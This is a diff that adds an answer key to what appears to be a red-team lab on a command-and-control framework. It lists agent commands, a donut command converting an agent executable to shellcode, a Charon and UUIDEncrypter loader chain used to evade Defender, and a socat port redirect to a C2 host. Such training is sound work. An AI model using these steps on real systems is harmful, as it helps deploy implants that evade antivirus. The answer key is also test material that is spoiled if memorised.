@@ -119,3 +119,35 @@ Create a `socat` listener on Kali for the `LoadConfig` listener to redirect the 
 
 ---
 
+## Answers
+
+<details>
+<summary>Task 3</summary>
+
+- Configure jitter to 50%: `config jitter 50`
+- List DNS cache entries: `listdns`
+- Minimum password length from Domaininfo BOF: `8`
+
+</details>
+
+---
+
+<details>
+<summary>Optional Task 1</summary>
+
+- Windows Gopher agent is detected by Defender
+- Beatrice does not bypass detection for Gopher
+- Convert to shellcode: `donut -i gopher_agent.exe -o gopher_load.bin`
+- Use Charon + UUIDEncrypter.py
+
+</details>
+
+---
+
+<details>
+<summary>Optional Task 2</summary>
+
+- Redirect port 8181 to 8090: `socat TCP4-LISTEN:8181,fork TCP:192.168.57.40:8090`
+- Execute `loaded_agent.x64.exe` from `C:\DevTools` (no AV/EDR evasion applied)
+
+</details>
